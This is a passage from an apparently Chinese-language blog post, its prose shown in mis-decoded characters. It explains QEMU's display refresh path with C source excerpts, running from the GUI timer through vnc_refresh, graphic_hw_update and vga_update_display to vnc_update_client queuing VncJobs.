class="type">uint64_t</span> dcl_interval;</span><br><span class="line">    DisplayState *ds = opaque;</span><br><span class="line">    DisplayChangeListener *dcl;</span><br><span class="line">    QemuConsole *con;</span><br><span class="line"></span><br><span class="line">    ds-&gt;refreshing = <span class="literal">true</span>;</span><br><span class="line">    dpy_refresh(ds);</span><br><span class="line">    ds-&gt;refreshing = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;</span><br><span class="line">        dcl_interval = dcl-&gt;update_interval ?</span><br><span class="line">            dcl-&gt;update_interval : GUI_REFRESH_INTERVAL_DEFAULT;</span><br><span class="line">        <span class="keyword">if</span> (interval &gt; dcl_interval) &#123;</span><br><span class="line">            interval = dcl_interval;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ds-&gt;update_interval != interval) &#123;</span><br><span class="line">        ds-&gt;update_interval = interval;</span><br><span class="line">        QTAILQ_FOREACH(con, &amp;consoles, next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (con-&gt;hw_ops-&gt;update_interval) &#123;</span><br><span class="line">                con-&gt;hw_ops-&gt;update_interval(con-&gt;hw, interval);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        trace_console_refresh(interval);</span><br><span class="line">    &#125;</span><br><span class="line">    ds-&gt;last_update = qemu_clock_get_ms(QEMU_CLOCK_REALTIME);</span><br><span class="line">    timer_mod(ds-&gt;gui_timer, ds-&gt;last_update + interval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è°ƒç”¨ <code>dpy_refresh()</code> ï¼Œè¯¥å‡½æ•°ä¼šéå† DisplayState ä¸­çš„æ‰€æœ‰ DisplayChangeListener å¹¶è°ƒç”¨ <code>dcl-&gt;ops-&gt;dpy_refresh()</code></li><li>éå† DisplayState ä¸­çš„æ‰€æœ‰ DisplayChangeListenerï¼Œæ£€æŸ¥ <code>dcl-&gt;update_interval</code></li><li>è‹¥ <code>ds-&gt;update_interval != interval</code>ï¼Œéå†æ‰€æœ‰çš„ QemuConsole å¹¶è°ƒç”¨ <code>con-&gt;hw_ops-&gt;update_interval()</code> è¿›è¡Œç¡¬ä»¶æ•°æ®æ›´æ–°</li></ul><h2 id="äºŒã€dpy-refresh-éå†-dcl-å¹¶è°ƒç”¨-dcl-gt-ops-gt-dpy-refresh-è¿›è¡Œæ›´æ–°"><a href="#äºŒã€dpy-refresh-éå†-dcl-å¹¶è°ƒç”¨-dcl-gt-ops-gt-dpy-refresh-è¿›è¡Œæ›´æ–°" class="headerlink" title="äºŒã€dpy_refresh - éå† dcl å¹¶è°ƒç”¨ dcl-&gt;ops-&gt;dpy_refresh è¿›è¡Œæ›´æ–°"></a>äºŒã€dpy_refresh - éå† dcl å¹¶è°ƒç”¨ dcl-&gt;ops-&gt;dpy_refresh è¿›è¡Œæ›´æ–°</h2><p><code>dpy_refresh()</code> æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯éå† DisplayState ä¸­çš„æ‰€æœ‰ DisplayChangeListener å¹¶è°ƒç”¨ <code>dcl-&gt;ops-&gt;dpy_refresh()</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">dpy_refresh</span><span class="params">(DisplayState *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    DisplayChangeListener *dcl;</span><br><span class="line"></span><br><span class="line">    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh) &#123;</span><br><span class="line">            dcl-&gt;ops-&gt;dpy_refresh(dcl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸ VNC æœ‰å…³çš„éƒ¨åˆ†ï¼Œå¯¹äº VNC è€Œè¨€ï¼Œå…¶ <code>dcl-&gt;ops-&gt;dpy_refresh</code> åº”ä¸º <code>vnc_refresh</code>ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">vnc_refresh</span><span class="params">(DisplayChangeListener *dcl)</span></span><br><span class="line">&#123;</span><br><span class="line">    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);</span><br><span class="line">    VncState *vs, *vn;</span><br><span class="line">    <span class="type">int</span> has_dirty, rects = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (QTAILQ_EMPTY(&amp;vd-&gt;clients)) &#123;   <span class="comment">// æ²¡æœ‰ clientï¼Œç›´æ¥è¿”å›</span></span><br><span class="line">        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_MAX);   <span class="comment">//æ›´æ–°è®¡æ—¶</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    graphic_hw_update(vd-&gt;dcl.con); <span class="comment">// ç¡¬ä»¶æ›´æ–°</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vnc_trylock_display(vd)) &#123;</span><br><span class="line">        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_BASE);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    has_dirty = vnc_refresh_server_surface(vd); <span class="comment">// æ£€æŸ¥æ˜¯å¦æœ‰å¾…æ›´æ–°æ•°æ®</span></span><br><span class="line">    vnc_unlock_display(vd);</span><br><span class="line"></span><br><span class="line">    QTAILQ_FOREACH_SAFE(vs, &amp;vd-&gt;clients, next, vn) &#123;</span><br><span class="line">        rects += vnc_update_client(vs, has_dirty);  <span class="comment">// éå†æ›´æ–° client</span></span><br><span class="line">        <span class="comment">/* vs might be free()ed here */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (has_dirty &amp;&amp; rects) &#123;</span><br><span class="line">        vd-&gt;dcl.update_interval /= <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (vd-&gt;dcl.update_interval &lt; VNC_REFRESH_INTERVAL_BASE) &#123;</span><br><span class="line">            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_BASE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        vd-&gt;dcl.update_interval += VNC_REFRESH_INTERVAL_INC;</span><br><span class="line">        <span class="keyword">if</span> (vd-&gt;dcl.update_interval &gt; VNC_REFRESH_INTERVAL_MAX) &#123;</span><br><span class="line">            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_MAX;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>æ£€æŸ¥æ˜¯å¦æœ‰è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œè‹¥å¦åˆ™æ›´æ–°è®¡æ—¶åç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>graphic_hw_update()</code> æ›´æ–° dcl å¯¹åº”çš„ QemuConsole å¯¹åº”çš„ç¡¬ä»¶è®¾å¤‡</li><li>è°ƒç”¨ <code>vnc_refresh_server_surface()</code> æ£€æŸ¥æ˜¯å¦æœ‰ dirty åŒºåŸŸï¼ˆå¾…æ›´æ–°åŒºåŸŸï¼‰</li><li>éå† dcl ä¸Šçš„ clientï¼Œ è°ƒç”¨ <code>vnc_update_client()</code> åˆ›å»ºæ–°çš„ VncJob æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Šï¼Œç”± worker thread è¿›è¡Œæ¨é€</li></ul><h2 id="ä¸‰ã€graphic-hw-update-å›¾å½¢ç¡¬ä»¶æ•°æ®æ›´æ–°"><a href="#ä¸‰ã€graphic-hw-update-å›¾å½¢ç¡¬ä»¶æ•°æ®æ›´æ–°" class="headerlink" title="ä¸‰ã€graphic_hw_update - å›¾å½¢ç¡¬ä»¶æ•°æ®æ›´æ–°"></a>ä¸‰ã€graphic_hw_update - å›¾å½¢ç¡¬ä»¶æ•°æ®æ›´æ–°</h2><p>å‰é¢æˆ‘ä»¬æ¶‰åŠåˆ°çš„éƒ½æ˜¯ consoleã€vnc è¿™ä¸€å—çš„æ•°æ®æ›´æ–°ï¼Œå¹¶æ²¡æœ‰è§¦åŠåˆ°å®é™…çš„ç¡¬ä»¶æ–¹é¢ï¼ˆqemu æ¨¡æ‹Ÿæ˜¾å¡ç­‰ï¼‰çš„æ›´æ–°ï¼Œè¿™ä¸€å—å®é™…çš„æ›´æ–°æ˜¯ç”± <code>graphic_hw_update()</code> æ¥å®Œæˆçš„ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">graphic_hw_update</span><span class="params">(QemuConsole *con)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span> async = <span class="literal">false</span>;</span><br><span class="line">    con = con ? con : active_console;</span><br><span class="line">    <span class="keyword">if</span> (!con) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (con-&gt;hw_ops-&gt;gfx_update) &#123;</span><br><span class="line">        con-&gt;hw_ops-&gt;gfx_update(con-&gt;hw);</span><br><span class="line">        async = con-&gt;hw_ops-&gt;gfx_update_async;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!async) &#123;</span><br><span class="line">        graphic_hw_update_done(con);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰é¢æˆ‘ä»¬è®²åˆ°ä¸€ä¸ª QemuConsole å¯¹åº”ä¸€ä¸ªæ˜¾ç¤ºè®¾å¤‡ï¼Œå› æ­¤åœ¨ <code>graphic_hw_update()</code> å½“ä¸­ä¼šç›´æ¥è°ƒç”¨ <code>con-&gt;hw_ops-&gt;gfx_update()</code> æ¥å®Œæˆç¡¬ä»¶æ–¹é¢çš„æ•°æ®æ›´æ–°</p><p>å¦‚æœæ˜¯çº¯å­—ç¬¦å‹æ˜¾ç¤ºè®¾å¤‡ï¼Œåˆ™ä¸º <code>text_console_ops</code>ï¼Œå®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œè¯¥å‡½æ•°è¡¨æ²¡æœ‰ <code>gfx_update</code> æŒ‡é’ˆï¼Œæ•…ä¼šç›´æ¥è¿”å›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> GraphicHwOps text_console_ops = &#123;</span><br><span class="line">    .invalidate  = text_console_invalidate,</span><br><span class="line">    .text_update = text_console_update,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯¹äºé»˜è®¤çš„å›¾å½¢åŒ–ç•Œé¢ï¼Œ<code>con-&gt;hw-&gt;ops</code> åº”ä¸º <code>vga_ops</code>ï¼Œå®šä¹‰äº <code>hw/display/vga.c</code> ä¸­ï¼Œå…¶ <code>gfx_update</code> æŒ‡é’ˆä¸º <code>vga_update_display</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> GraphicHwOps vga_ops = &#123;</span><br><span class="line">    .invalidate  = vga_invalidate_display,</span><br><span class="line">    .gfx_update  = vga_update_display,</span><br><span class="line">    .text_update = vga_update_text,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸»è¦æ˜¯æ ¹æ®æŒ‡å®šçš„ç¡¬ä»¶å†³å®šçš„ï¼Œé»˜è®¤çš„å›¾å½¢ç•Œé¢ä¾¿æ˜¯ <code>vga_ops</code>ï¼Œå¦‚æœä½ åœ¨å¯åŠ¨æ—¶æŒ‡å®šäº†ä¸€ä¸ª QXL æ˜¾å¡ï¼Œé‚£ä¹ˆè¿™é‡Œå°±åº”è¯¥æ˜¯ <code>qxl_ops</code>ï¼Œæœ€ç»ˆè°ƒç”¨åˆ° <code>qxl_hw_update()</code></p></blockquote><p>è¯¥å‡½æ•°å®šä¹‰äº <code>hw/display/vga.c</code> ä¸­ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯æ ¹æ®æ˜¾ç¤ºæ¨¡å¼è°ƒç”¨ä¸åŒçš„æ›´æ–°å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">vga_update_display</span><span class="params">(<span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    VGACommonState *s = opaque;</span><br><span class="line">    DisplaySurface *surface = qemu_console_surface(s-&gt;con);</span><br><span class="line">    <span class="type">int</span> full_update, graphic_mode;</span><br><span class="line"></span><br><span class="line">    qemu_flush_coalesced_mmio_buffer();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (surface_bits_per_pixel(surface) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* nothing to do */</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        full_update = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;ar_index &amp; <span class="number">0x20</span>)) &#123;</span><br><span class="line">            graphic_mode = GMODE_BLANK;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            graphic_mode = s-&gt;gr[VGA_GFX_MISC] &amp; VGA_GR06_GRAPHICS_MODE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (graphic_mode != s-&gt;graphic_mode) &#123;</span><br><span class="line">            s-&gt;graphic_mode = graphic_mode;</span><br><span class="line">            s-&gt;cursor_blink_time = qemu_clock_get_ms(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">            full_update = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span>(graphic_mode) &#123;</span><br><span class="line">        <span class="keyword">case</span> GMODE_TEXT:</span><br><span class="line">            vga_draw_text(s, full_update);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> GMODE_GRAPH:</span><br><span class="line">            vga_draw_graphic(s, full_update);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> GMODE_BLANK:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            vga_draw_blank(s, full_update);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™äº› <code>vga_draw_*</code> å‡½æ•°æœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>dpy_gfx_update()</code> å°†æ›´æ–°æ¨é€åˆ°æ˜¾ç¤ºè®¾å¤‡ä¸Šï¼Œå…¶å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dpy_gfx_update</span><span class="params">(QemuConsole *con, <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> w, <span class="type">int</span> h)</span></span><br><span class="line">&#123;</span><br><span class="line">    DisplayState *s = con-&gt;ds;</span><br><span class="line">    DisplayChangeListener *dcl;</span><br><span class="line">    <span class="type">int</span> width = qemu_console_get_width(con, x + w);</span><br><span class="line">    <span class="type">int</span> height = qemu_console_get_height(con, y + h);</span><br><span class="line"></span><br><span class="line">    x = MAX(x, <span class="number">0</span>);</span><br><span class="line">    y = MAX(y, <span class="number">0</span>);</span><br><span class="line">    x = MIN(x, width);</span><br><span class="line">    y = MIN(y, height);</span><br><span class="line">    w = MIN(w, width - x);</span><br><span class="line">    h = MIN(h, height - y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!qemu_console_is_visible(con)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dpy_gfx_update_texture(con, con-&gt;surface, x, y, w, h);</span><br><span class="line">    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (con != (dcl-&gt;con ? dcl-&gt;con : active_console)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update) &#123;</span><br><span class="line">            dcl-&gt;ops-&gt;dpy_gfx_update(dcl, x, y, w, h);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è‹¥ QemuConsole ä¸å¯è§†ï¼Œç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>dpy_gfx_update_texture()</code>ï¼Œå…¶æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>con-&gt;gl-&gt;ops-&gt;dpy_gl_ctx_update_texture()</code>ï¼Œè¿™ä¸€å—æ˜¯ä¸ GL ç›¸å…³çš„æ“ä½œï¼Œè¿™é‡Œæš‚ä¸”ä¸å±•å¼€</li><li>éå† QemuConsole ä¸Šçš„ DisplayChangeListenerï¼Œè°ƒç”¨ <code>dcl-&gt;ops-&gt;dpy_gfx_update()</code>ï¼Œæ›´æ–° dcl å¯¹åº”çš„ display è®¾å¤‡</li></ul><p>å¯¹äº VNC è€Œè¨€ï¼Œ<code>dcl-&gt;ops-&gt;dpy_gfx_update</code> æŒ‡é’ˆåº”ä¸º <code>vnc_dpy_update()</code> å‡½æ•°ï¼Œå®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œä¸»è¦å°±æ˜¯è°ƒç”¨ <code>vnc_set_area_dirty()</code> å°†ä¸€å—åŒºåŸŸæ ‡è®°ä¸º dirtyï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">vnc_dpy_update</span><span class="params">(DisplayChangeListener *dcl,</span></span><br><span class="line"><span class="params">                           <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> w, <span class="type">int</span> h)</span></span><br><span class="line">&#123;</span><br><span class="line">    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">VncSurface</span> *<span class="title">s</span> =</span> &amp;vd-&gt;guest;</span><br><span class="line"></span><br><span class="line">    vnc_set_area_dirty(s-&gt;dirty, vd, x, y, w, h);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè¿™äº›è¢«æ ‡è®°ä¸º dirty çš„åŒºåŸŸä¼šåœ¨ <code>vnc_refresh()</code> ä¸­è°ƒç”¨ <code>vnc_refresh_server_surface()</code> æ—¶è¢«è¿›ä¸€æ­¥å¤„ç†ï¼Œåœ¨ <code>vnc_update_client()</code> ä¸­å˜ä¸ºæ–°çš„ VncJob é“¾åˆ°å…¨å±€é“¾è¡¨ä¸Š</p><h2 id="å››ã€vnc-client-update-åˆ›å»ºæ–°çš„-VncJob-æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Š"><a href="#å››ã€vnc-client-update-åˆ›å»ºæ–°çš„-VncJob-æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Š" class="headerlink" title="å››ã€vnc_client_update - åˆ›å»ºæ–°çš„ VncJob æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Š"></a>å››ã€vnc_client_update - åˆ›å»ºæ–°çš„ VncJob æŒ‚è½½åˆ°å…¨å±€é“¾è¡¨ä¸Š</h2><p>å½“å‰é¢æˆ‘ä»¬å°†ç‰¹å®šçš„æ˜¾ç¤ºåŒºåŸŸæ ‡è®°ä¸º dirty ä¹‹åï¼Œæœ€ç»ˆä¼šç”± <code>vnc_update_client()</code> å‡½æ•°æ¥æ‰«æ dirty åŒºåŸŸï¼Œå¹¶åˆ›å»ºç›¸åº”çš„ VncJob æŒ‚è½½åˆ°å…¨å±€çš„ queue ä¸Šï¼Œå› æ­¤æœ€åå®é™…ä¸Šè¿˜æ˜¯ç”± vnc worker thread å®Œæˆæ¨é€çš„ä»»åŠ¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vnc_update_client</span><span class="params">(VncState *vs, <span class="type">int</span> has_dirty)</span></span><br><span class="line">&#123;</span><br><span class="line">    VncDisplay *vd = vs-&gt;vd;</span><br><span class="line">    VncJob *job;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    <span class="type">int</span> height, width;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vs-&gt;disconnecting) &#123;</span><br><span class="line">        vnc_disconnect_finish(vs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vs-&gt;has_dirty += has_dirty;</span><br><span class="line">    <span class="keyword">if</span> (!vnc_should_update(vs)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!vs-&gt;has_dirty &amp;&amp; vs-&gt;update != VNC_STATE_UPDATE_FORCE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Send screen updates to the vnc client using the server</span></span><br><span class="line"><span class="comment">     * surface and server dirty map.  guest surface updates</span></span><br><span class="line"><span class="comment">     * happening in parallel don&#x27;t disturb us, the next pass will</span></span><br><span class="line"><span class="comment">     * send them to the client.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    job = vnc_job_new(vs);  <span class="comment">// åˆ›å»ºæ–°çš„ VncJob</span></span><br><span class="line"></span><br><span class="line">    height = pixman_image_get_height(vd-&gt;server);</span><br><span class="line">    width = pixman_image_get_width(vd-&gt;server);</span><br><span class="line"></span><br><span class="line">    y = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">// æ‰«æ dirty åŒºåŸŸ</span></span><br><span class="line">        <span class="type">int</span> x, h;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> x2;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> offset = find_next_bit((<span class="type">unsigned</span> <span class="type">long</span> *) &amp;vs-&gt;dirty,</span><br><span class="line">                                             height * VNC_DIRTY_BPL(vs),</span><br><span class="line">                                             y * VNC_DIRTY_BPL(vs));</span><br><span class="line">        <span class="keyword">if</span> (offset == height * VNC_DIRTY_BPL(vs)) &#123;</span><br><span class="line">            <span class="comment">/* no more dirty bits */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        y = offset / VNC_DIRTY_BPL(vs);</span><br><span class="line">        x = offset % VNC_DIRTY_BPL(vs);</span><br><span class="line">        x2 = find_next_zero_bit((<span class="type">unsigned</span> <span class="type">long</span> *) &amp;vs-&gt;dirty[y],</span><br><span class="line">                                VNC_DIRTY_BPL(vs), x);</span><br><span class="line">        bitmap_clear(vs-&gt;dirty[y], x, x2 - x);</span><br><span class="line">        h = find_and_clear_dirty_height(vs, y, x, x2, height);</span><br><span class="line">        x2 = MIN(x2, width / VNC_DIRTY_PIXELS_PER_BIT);</span><br><span class="line">        <span class="keyword">if</span> (x2 &gt; x) &#123;</span><br><span class="line">            <span class="comment">// åˆ›å»ºæ–°çš„ VncRectï¼ŒæŒ‚è½½åˆ° VncJob ä¸Š</span></span><br><span class="line">            n += vnc_job_add_rect(job, x * VNC_DIRTY_PIXELS_PER_BIT, y,</span><br><span class="line">                                  (x2 - x) * VNC_DIRTY_PIXELS_PER_BIT, h);</span><br><span class="line">        &#125;</span><br><span class="line">        <span 